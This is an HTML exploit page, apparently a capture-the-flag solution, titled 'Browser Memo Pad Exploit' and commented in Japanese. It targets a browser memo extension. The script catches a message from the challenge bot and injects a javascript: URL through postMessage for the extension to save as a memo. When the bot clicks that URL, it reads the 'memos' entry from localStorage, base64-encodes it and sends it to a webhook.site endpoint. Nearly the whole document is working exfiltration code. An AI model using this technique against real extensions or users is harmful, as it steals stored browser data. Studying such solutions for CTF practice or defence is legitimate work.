<!DOCTYPE html>
<html>
<body>
    <h1>Browser Memo Pad Exploit</h1>
    <p>Waiting for bot...</p>
    <script>
        window.addEventListener("message", (event) => {
            if (event.source !== window) return;

            // `bot.js`からフラグを含むメッセージを受信
            if (event.data?.type === "create") {
                // 拡張機能がメモとして保存する悪意のあるURLを生成
                // このURLは、botがクリックすると`localStorage`からメモ（フラグ）を抜き取り、
                // 攻撃者のサーバー（webhook.site）に送信する
                const maliciousUrl = `javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174/" + btoa(localStorage.getItem("memos")))`;
                
                // 拡張機能の`content.js`に悪意のあるURLを送信し、メモとして保存させる
                window.postMessage({ type: 'create', payload: maliciousUrl });
            }
        });
    </script>
</body>
</html>
